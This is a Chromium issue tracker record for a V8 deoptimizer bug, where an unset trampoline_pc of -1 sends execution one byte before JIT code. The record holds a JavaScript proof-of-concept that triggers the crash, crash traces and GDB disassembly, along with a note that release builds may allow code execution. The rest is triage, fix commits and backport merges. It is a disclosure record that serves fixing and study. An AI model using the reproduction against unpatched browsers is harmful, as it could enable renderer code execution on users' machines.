# Security: Debug check failed: code == topmost_ implies safe_to_deopt_

| Field | Value |
|-------|-------|
| **Issue ID** | [40054275](https://issues.chromium.org/issues/40054275) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>JavaScript>Compiler |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ty...@gmail.com |
| **Assignee** | ne...@chromium.org |
| **Created** | 2020-12-23 |
| **Bounty** | $16,000.00 |

## Description

**VULNERABILITY DETAILS**  

In v8, it is possible to enter a state where there is an inconsistency with code being marked for deoptimization. For a debug build, this results in a DCHECK failure like

# Fatal error in ../../../src/deoptimizer/deoptimizer.cc, line 278

# Debug check failed: code == topmost\_ implies safe\_to\_deopt\_.

In a normal release build (without DCHECK), the bug is much worse: the calculation performed in the surrounding code in deoptimizer calculates a new pc value to use to jump to the deoptimized code. An offset value (trampoline\_pc) is fetched, but in this erroneous state, the offset is still the default value of -1.  

( see <https://source.chromium.org/chromium/chromium/src/+/master:v8/src/deoptimizer/deoptimizer.cc;l=268>  

and  

<https://source.chromium.org/chromium/chromium/src/+/master:v8/src/codegen/safepoint-table.h;l=24>  

)

This results in setting pc to one byte before the start of the jitted code.  

Depending on the exact instructions used, and the data in the region immediately before the jitted code, this can lead to code execution, with no need to worry about ASLR (as v8 adjusts the pc relative to the existing code buffer), or any fancy pointer signing stuff.

The simplest patch would maybe be a check that safepoint.has\_deoptimization\_index() or that trampoline\_pc is non-negative, or another similar check like maybe code.CanDeoptAt(it.frame()->pc()) to guard the deoptimization path.

**VERSION**  

Chrome Version: master  

[ looks like the bug was introduced in https://chromium.googlesource.com/v8/v8/+/a447a44f31fc153590598698d33d6efd73334be4  

so v8 >= 8.3.42 ]  

Operating System: all

**REPRODUCTION CASE**  

for (let i = 0; i < 3; i++) {  

for (let j = 0; j < 32767; j++) {  

Number;  

}  

for (let j = 0; j < 2335; j++) {  

Number;  

}  

var arr = [, ...(new Int16Array(0xffff)), 4294967296];  

arr.concat(Number, arr)  

}  

eval(``);

(also attached)

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: v8  

Crash State:

For a debug build:

$ v8/v8/src/out/debug/d8 poc\_minimized.js

# 

# Fatal error in ../../../src/deoptimizer/deoptimizer.cc, line 278

# Debug check failed: code == topmost\_ implies safe\_to\_deopt\_.

# 

# 

# 

#FailureMessage Object: 0x7ffee9a61060  

==== C stack trace ===============================

```
v8/v8/src/out/debug/d8(v8::base::debug::StackTrace::StackTrace()+0x22) [0x556ec3dfe8f2]  
v8/v8/src/out/debug/d8(+0xbd9ed7) [0x556ec3df9ed7]  
v8/v8/src/out/debug/d8(V8_Fatal(char const\*, int, char const\*, ...)+0x16e) [0x556ec3dec57e]  
v8/v8/src/out/debug/d8(+0xbcbd55) [0x556ec3debd55]  
v8/v8/src/out/debug/d8(+0xfb4a6b) [0x556ec41d4a6b]  
v8/v8/src/out/debug/d8(v8::internal::Deoptimizer::DeoptimizeMarkedCodeForContext(v8::internal::NativeContext)+0xb7e) [0x556ec41d3d0e]  
v8/v8/src/out/debug/d8(v8::internal::Deoptimizer::DeoptimizeMarkedCode(v8::internal::Isolate\*)+0x256) [0x556ec41d5756]  
v8/v8/src/out/debug/d8(v8::internal::DependentCode::DeoptimizeDependentCodeGroup(v8::internal::DependentCode::DependencyGroup)+0x84) [0x556ec478b464]  
v8/v8/src/out/debug/d8(bool v8::internal::AllocationSite::DigestTransitionFeedback<(v8::internal::AllocationSiteUpdateMode)0>(v8::internal::Handle<v8::internal::AllocationSite>, v8::internal::ElementsKind)+0xb2d) [0x556ec4a338ad]  
v8/v8/src/out/debug/d8(bool v8::internal::JSObject::UpdateAllocationSite<(v8::internal::AllocationSiteUpdateMode)0>(v8::internal::Handle<v8::internal::JSObject>, v8::internal::ElementsKind)+0x59c) [0x556ec4a32bac]  
v8/v8/src/out/debug/d8(+0x160dcfe) [0x556ec482dcfe]  
v8/v8/src/out/debug/d8(+0x16062e5) [0x556ec48262e5]  
v8/v8/src/out/debug/d8(v8::internal::JSObject::AddDataElement(v8::internal::Handle<v8::internal::JSObject>, unsigned int, v8::internal::Handle<v8::internal::Object>, v8::internal::PropertyAttributes)+0xb76) [0x556ec4a882e6]  
v8/v8/src/out/debug/d8(v8::internal::Object::AddDataProperty(v8::internal::LookupIterator\*, v8::internal::Handle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::StoreOrigin)+0xd4b) [0x556ec4bd58cb]  
v8/v8/src/out/debug/d8(v8::internal::JSObject::DefineOwnPropertyIgnoreAttributes(v8::internal::LookupIterator\*, v8::internal::Handle<v8::internal::Object>, v8::internal::PropertyAttributes, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::JSObject::AccessorInfoHandling)+0x2c0) [0x556ec4a4be00]  
v8/v8/src/out/debug/d8(+0x17cb302) [0x556ec49eb302]  
v8/v8/src/out/debug/d8(+0x17d964e) [0x556ec49f964e]  
v8/v8/src/out/debug/d8(+0x30405ff) [0x556ec62605ff]  

```

Received signal 4 ILL\_ILLOPN 556ec3df6226  

Illegal instruction

For a non-debug build:  

v8/v8/src/out/normal/d8 poc\_minimized.js  

Received signal 11 SEGV\_MAPERR 55e0e44fd079

==== C stack trace ===============================

[0x55e0e19c2b57]  

[0x7f267b267980]  

[0x2da90008731f]  

[end of stack trace]  

Segmentation fault

And in GDB:  

Thread 1 "d8" received signal SIGSEGV, Segmentation fault.  

0x000009a80008731f in ?? ()  

(gdb) x/5i $pc  

=> 0x9a80008731f: add %cl,0x349d059(%rbx)  

0x9a800087325: (bad)  

0x9a800087327: rex.XB (bad)  

0x9a800087329: add %esi,0x49(%rbp,%rcx,1)  

0x9a80008732d: mov $0x5678ab80,%edx  

(gdb) p/x $rbx  

$3 = 0x555555fae020  

(gdb) p/x $rbx + 0x349d059  

$5 = 0x55555944b079  

(gdb) x/5i $pc+1  

0x9a800087320: mov -0x30(%rcx),%ebx  

0x9a800087323: add %r13,%rbx  

0x9a800087326: testb $0x1,0x7(%rbx)  

0x9a80008732a: je 0x9a800087339  

0x9a80008732c: movabs $0x55555678ab80,%r10  

(gdb)

**CREDIT INFORMATION**  

Reporter credit: Tyler Nighswander (@tylerni7) of Theori

## Attachments

- [poc_minimized.js](attachments/poc_minimized.js) (text/plain, 248 B)

## Timeline

### [Deleted User] (2020-12-23)

[Empty comment from Monorail migration]

### aj...@google.com (2020-12-23)

Thanks for the report and analysis. CC'ing some v8 folks you will hopefully take a look.

I will attempt to repro tomorrow. Tentatively marking as severity high as this might lead to renderer code execution.

[Monorail components: Blink>JavaScript>Compiler]

### aj...@google.com (2020-12-23)

(+ some more v8 folks from OWNERS)

### [Deleted User] (2020-12-23)

Setting milestone and target because of Security_Impact=Stable and high severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2020-12-23)

Setting Pri-1 to match security severity High. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### cl...@chromium.org (2020-12-23)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5682349085097984.

### cl...@chromium.org (2020-12-23)

ClusterFuzz testcase 5682349085097984 appears to be flaky, updating reproducibility label.

### cl...@chromium.org (2020-12-23)

Detailed Report: https://clusterfuzz.com/testcase?key=5682349085097984

Fuzzer: None
Job Type: linux_asan_d8
Platform Id: linux

Crash Type: Ill
Crash Address: 0x55a9a72dac5c
Crash State:
  v8::internal::Runtime_Abort
  Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_NoBuiltinExit
  Builtins_JSEntryTrampoline
  
Sanitizer: address (ASAN)

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_d8&revision=71871

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5682349085097984

The reproduce tool requires a ClusterFuzz source checkout. To prepare one, run:

git clone https://github.com/google/clusterfuzz && cd clusterfuzz && git checkout tags/reproduce-tool-stable

To reproduce this issue, run:

./reproduce.sh -t https://clusterfuzz.com/testcase-detail/5682349085097984 -b /path/to/build

Please use the GN arguments provided in this report when building the binary. If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


************************* UNREPRODUCIBLE *************************
Note: This crash might not be reproducible with the provided testcase. That said, for the past 14 days, we've been seeing this crash frequently.

It may be possible to reproduce by trying the following options:
- Run testcase multiple times for a longer duration.
- Run fuzzing without testcase argument to hit the same crash signature.

If it still does not reproduce, try a speculative fix based on the crash stacktrace and verify if it works by looking at the crash statistics in the report. We will auto-close the bug if the crash is not seen for 14 days.
******************************************************************

### aj...@google.com (2020-12-23)

This repros - see CF for details.

### jg...@chromium.org (2020-12-31)

Confirming the repro, Santiago ptal. I'll land an additional CHECK as suggested in the report until you get around to fixing this properly.

### jg...@chromium.org (2020-12-31)

+bmeurer to review the quick fix.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2020-12-31)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/506e893b812e03dbebe34b11d8aa9d4eb6869d89

commit 506e893b812e03dbebe34b11d8aa9d4eb6869d89
Author: Jakob Gruber <jgruber@chromium.org>
Date: Thu Dec 31 10:10:39 2020

[deoptimizer] Stricter checks during deoptimization

.. to verify that the trampoline_pc has been set.

Bug: chromium:1161357
Change-Id: If7e1a13cff9919e2e8a65c095d80dfcef2dc05cb
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2606333
Commit-Queue: Jakob Gruber <jgruber@chromium.org>
Auto-Submit: Jakob Gruber <jgruber@chromium.org>
Reviewed-by: Benedikt Meurer <bmeurer@chromium.org>
Cr-Commit-Position: refs/heads/master@{#71896}

[modify] https://crrev.com/506e893b812e03dbebe34b11d8aa9d4eb6869d89/src/deoptimizer/deoptimizer.cc
[modify] https://crrev.com/506e893b812e03dbebe34b11d8aa9d4eb6869d89/test/mjsunit/mjsunit.status
[add] https://crrev.com/506e893b812e03dbebe34b11d8aa9d4eb6869d89/test/mjsunit/regress/regress-1161357.js


### so...@chromium.org (2021-01-05)

Looking into this

### cl...@chromium.org (2021-01-05)

ClusterFuzz testcase 5682349085097984 is verified as fixed in https://clusterfuzz.com/revisions?job=linux_asan_d8&range=71895:71896

If this is incorrect, please add the ClusterFuzz-Wrong label and re-open the issue.

### so...@chromium.org (2021-01-05)

Can repro locally, so I am reopening

### bm...@chromium.org (2021-01-05)

[Empty comment from Monorail migration]

### ne...@chromium.org (2021-01-05)

I don't think the real bug is related to Santiago's changes. I will probably have a fix on Thursday (tomorrow is a public holiday here).

### ne...@chromium.org (2021-01-05)

[Empty comment from Monorail migration]

### ty...@gmail.com (2021-01-05)

With the caveat that I am not a v8 expert: I also don't think the bad behavior was necessarily caused by the revision I listed ( a447a44f31fc153590598698d33d6efd73334be4 ) more like exposed.
It seemed like something was wrong with having more opportunities for optimizing due to JumpLoop: I'm not sure exactly, but something like triggering optimization twice in the same top level loop? and perhaps that patch allowed that to happen more easily.
The iteration counts for the two inner loops (the ones over j) are what is required to trigger optimization twice in the same iteration (or so it seems with some console.log debugging and running v8 with --trace-osr).

Not sure if that's helpful, just trying to add in some info that I glossed over in the initial report in case it helps better identify the root cause.

### ne...@chromium.org (2021-01-07)

[Empty comment from Monorail migration]

### ne...@chromium.org (2021-01-07)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2021-01-07)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/b837e0338963611c08344cbb6f655a0abd9238c1

commit b837e0338963611c08344cbb6f655a0abd9238c1
Author: Georg Neis <neis@chromium.org>
Date: Thu Jan 07 10:27:53 2021

[compiler] Mark JSStoreInArrayLiteral as needing a frame state

Bug: chromium:1161357
Change-Id: I7a4237fd682689742e67cd1f35e6ef91815386e0
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2611249
Auto-Submit: Georg Neis <neis@chromium.org>
Reviewed-by: Mythri Alle <mythria@chromium.org>
Commit-Queue: Mythri Alle <mythria@chromium.org>
Cr-Commit-Position: refs/heads/master@{#71943}

[modify] https://crrev.com/b837e0338963611c08344cbb6f655a0abd9238c1/src/compiler/operator-properties.cc


### ne...@chromium.org (2021-01-07)

I'd like to back-merge both the CL in #22 and the one in #12. #22 fixes the reported bug. #12 turns such a bug into a CHECK failure, in case a similar bug exists or is introduced in the future.

The bug is hard to trigger and I don't currently have a regression test for Chromium.

### [Deleted User] (2021-01-07)

This bug requires manual review: We are only 11 days from stable.
Before a merge request will be considered, the following information is required to be added to this bug:

1. Does your merge fit within the Merge Decision Guidelines?
- Chrome: https://chromium.googlesource.com/chromium/src.git/+/master/docs/process/merge_request.md#when-to-request-a-merge
- Chrome OS: https://goto.google.com/cros-release-branch-merge-guidelines
2. Links to the CLs you are requesting to merge.
3. Has the change landed and been verified on ToT?
4. Does this change need to be merged into other active release branches (M-1, M+1)?
5. Why are these changes required in this milestone after branch?
6. Is this a new feature?
7. If it is a new feature, is it behind a flag using finch?

Chrome OS Only:
8. Was the change reviewed and approved by the Eng Prod Representative? See Eng Prod ownership by component: http://go/cros-engprodcomponents

Please contact the milestone owner if you have questions.
Owners: govind@(Android), bindusuvarna@(iOS), marinakz@(ChromeOS), srinivassista @(Desktop)

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ne...@chromium.org (2021-01-07)

1. Yes, security fix.
2. https://chromium.googlesource.com/v8/v8/+/506e893b812e03dbebe34b11d8aa9d4eb6869d89 and https://chromium.googlesource.com/v8/v8/+/b837e0338963611c08344cbb6f655a0abd9238c1
3. In V8 yes.  The second CL hasn't yet rolled into Chromium, but I also don't have a repro for Chromium.
4. Yes.
5. Security fix.
6. No.
8. No. I don't understand what to search for in this spread sheet.

### sr...@google.com (2021-01-07)

for merge review

### ad...@chromium.org (2021-01-07)

Approving merge to M88.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2021-01-08)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/44d052c19df0801fafdf2be54c899db65e79c67a

commit 44d052c19df0801fafdf2be54c899db65e79c67a
Author: Georg Neis <neis@chromium.org>
Date: Fri Jan 08 08:58:47 2021

Merged: [deoptimizer] Stricter checks during deoptimization

Revision: 506e893b812e03dbebe34b11d8aa9d4eb6869d89

BUG=chromium:1161357
NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
R=mythria@chromium.org

Change-Id: I97b69ae11d85bc0acd4a0c7bd28e1b692433de80
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2616219
Reviewed-by: Mythri Alle <mythria@chromium.org>
Commit-Queue: Georg Neis <neis@chromium.org>
Cr-Commit-Position: refs/branch-heads/8.8@{#23}
Cr-Branched-From: 2dbcdc105b963ee2501c82139eef7e0603977ff0-refs/heads/8.8.278@{#1}
Cr-Branched-From: 366d30c99049b3f1c673f8a93deb9f879d0fa9f0-refs/heads/master@{#71094}

[modify] https://crrev.com/44d052c19df0801fafdf2be54c899db65e79c67a/src/deoptimizer/deoptimizer.cc
[modify] https://crrev.com/44d052c19df0801fafdf2be54c899db65e79c67a/test/mjsunit/mjsunit.status
[add] https://crrev.com/44d052c19df0801fafdf2be54c899db65e79c67a/test/mjsunit/regress/regress-1161357.js


### bu...@chops-service-accounts.iam.gserviceaccount.com (2021-01-08)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/c2537ebd0ef88d3e75bc8ec95fadcfd7e4b1ae0a

commit c2537ebd0ef88d3e75bc8ec95fadcfd7e4b1ae0a
Author: Georg Neis <neis@chromium.org>
Date: Fri Jan 08 12:54:51 2021

[compiler] Update test expectation

Now that the underlying bug is fixed, we can expect the test to always
pass.

Also simplify the test a tiny bit and skip it on debug builds because
it's slow.

Bug: chromium:1161357
Change-Id: I2ce5e064b4f707f4bd680f04df95d5a342bec1b0
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2616220
Reviewed-by: Santiago Aboy Solanes <solanes@chromium.org>
Commit-Queue: Santiago Aboy Solanes <solanes@chromium.org>
Auto-Submit: Georg Neis <neis@chromium.org>
Cr-Commit-Position: refs/heads/master@{#71972}

[modify] https://crrev.com/c2537ebd0ef88d3e75bc8ec95fadcfd7e4b1ae0a/test/mjsunit/mjsunit.status
[delete] https://crrev.com/1f7a018a073704df091ab6fecae045b1b89820c6/test/mjsunit/regress/regress-1161357.js
[add] https://crrev.com/c2537ebd0ef88d3e75bc8ec95fadcfd7e4b1ae0a/test/mjsunit/compiler/regress-1161357.js


### bu...@chops-service-accounts.iam.gserviceaccount.com (2021-01-08)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/0919d75030f2d50567ce4ecb3c35a31d56dbfff2

commit 0919d75030f2d50567ce4ecb3c35a31d56dbfff2
Author: Georg Neis <neis@chromium.org>
Date: Fri Jan 08 15:04:09 2021

Merged: [compiler] Mark JSStoreInArrayLiteral as needing a frame state

Revision: b837e0338963611c08344cbb6f655a0abd9238c1

BUG=chromium:1161357
NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
R=mythria@chromium.org

Change-Id: Ic95dfd20d45d895934dee1592ebf427544eec73b
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2616223
Reviewed-by: Mythri Alle <mythria@chromium.org>
Commit-Queue: Georg Neis <neis@chromium.org>
Cr-Commit-Position: refs/branch-heads/8.8@{#24}
Cr-Branched-From: 2dbcdc105b963ee2501c82139eef7e0603977ff0-refs/heads/8.8.278@{#1}
Cr-Branched-From: 366d30c99049b3f1c673f8a93deb9f879d0fa9f0-refs/heads/master@{#71094}

[modify] https://crrev.com/0919d75030f2d50567ce4ecb3c35a31d56dbfff2/src/compiler/operator-properties.cc


### ne...@chromium.org (2021-01-08)

[Empty comment from Monorail migration]

### [Deleted User] (2021-01-08)

[Empty comment from Monorail migration]

### [Deleted User] (2021-01-08)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2021-01-12)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/4113b70d43b2ec4ea7f3a42018ac2172c884ef29

commit 4113b70d43b2ec4ea7f3a42018ac2172c884ef29
Author: Jakob Gruber <jgruber@chromium.org>
Date: Tue Jan 12 11:49:59 2021

[cleanup] Add named constant SafepointEntry::kNoTrampolinePC

.. instead of implicitly using -1 as a marker in a few spots.

Bug: chromium:1161357
Change-Id: Icfb9a2b81dbda844c8405c57454d63ae89dfe4f9
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2606336
Commit-Queue: Jakob Gruber <jgruber@chromium.org>
Reviewed-by: Georg Neis <neis@chromium.org>
Reviewed-by: Andreas Haas <ahaas@chromium.org>
Auto-Submit: Jakob Gruber <jgruber@chromium.org>
Cr-Commit-Position: refs/heads/master@{#72037}

[modify] https://crrev.com/4113b70d43b2ec4ea7f3a42018ac2172c884ef29/src/deoptimizer/deoptimizer.cc
[modify] https://crrev.com/4113b70d43b2ec4ea7f3a42018ac2172c884ef29/src/wasm/wasm-code-manager.cc
[modify] https://crrev.com/4113b70d43b2ec4ea7f3a42018ac2172c884ef29/src/codegen/safepoint-table.h


### am...@google.com (2021-01-14)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@google.com (2021-01-14)

Congratulations! The VRP panel has decided to award you $16000 for this report. Someone from the finance team should be reaching out to you soon. Great job and thank you again for this submission!

### ad...@google.com (2021-01-14)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-15)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-15)

[Empty comment from Monorail migration]

### am...@google.com (2021-01-19)

[Empty comment from Monorail migration]

### [Deleted User] (2021-01-20)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-21)

[Empty comment from Monorail migration]

### ac...@chromium.org (2021-01-26)

[Empty comment from Monorail migration]

### gi...@google.com (2021-01-27)

[Empty comment from Monorail migration]

### ac...@chromium.org (2021-01-27)

[Empty comment from Monorail migration]

### bu...@chops-service-accounts.iam.gserviceaccount.com (2021-01-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/ad2c5dae4688ff92105b609e5d554c76a9037baf

commit ad2c5dae4688ff92105b609e5d554c76a9037baf
Author: Achuith Bhandarkar <achuith@chromium.org>
Date: Wed Jan 27 01:53:05 2021

Merged: [deoptimizer] Stricter checks during deoptimization

Revision: 506e893b812e03dbebe34b11d8aa9d4eb6869d89

BUG=chromium:1161357
NOTRY=true
NOPRESUBMIT=true
NOTREECHECKS=true
R=​mythria@chromium.org

(cherry picked from commit 44d052c19df0801fafdf2be54c899db65e79c67a)

Change-Id: I97b69ae11d85bc0acd4a0c7bd28e1b692433de80
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2616219
Reviewed-by: Mythri Alle <mythria@chromium.org>
Commit-Queue: Georg Neis <neis@chromium.org>
Cr-Original-Commit-Position: refs/branch-heads/8.8@{#23}
Cr-Original-Branched-From: 2dbcdc105b963ee2501c82139eef7e0603977ff0-refs/heads/8.8.278@{#1}
Cr-Original-Branched-From: 366d30c99049b3f1c673f8a93deb9f879d0fa9f0-refs/heads/master@{#71094}
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/2649571
Reviewed-by: Victor-Gabriel Savu <vsavu@google.com>
Commit-Queue: Achuith Bhandarkar <achuith@chromium.org>
Cr-Commit-Position: refs/branch-heads/8.6@{#56}
Cr-Branched-From: a64aed2333abf49e494d2a5ce24bbd14fff19f60-refs/heads/8.6.395@{#1}
Cr-Branched-From: a626bc036236c9bf92ac7b87dc40c9e538b087e3-refs/heads/master@{#69472}

[modify] https://crrev.com/ad2c5dae4688ff92105b609e5d554c76a9037baf/src/deoptimizer/deoptimizer.cc


### ac...@chromium.org (2021-01-27)

[Empty comment from Monorail migration]

### am...@google.com (2021-02-09)

[Empty comment from Monorail migration]

### [Deleted User] (2021-03-03)

[Empty comment from Monorail migration]

### ad...@google.com (2021-03-25)

[Empty comment from Monorail migration]

### [Deleted User] (2021-04-15)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1161357?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

### ti...@chromium.org (2024-06-27)

Adding `ClusterFuzz-Ignore` hotlist to all `ClusterFuzz-Wrong` issues per crbug.com/40285975.

### ti...@chromium.org (2024-06-27)

Adding `ClusterFuzz-Ignore` hotlist to all `ClusterFuzz-Wrong` issues per crbug.com/40285975.

### cl...@chromium.org (2026-01-08)

Removing `Clusterfuzz-ignore` hotlist from some old bugs as it's preventing Clusterfuzz from filing similar bugs.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40054275)*
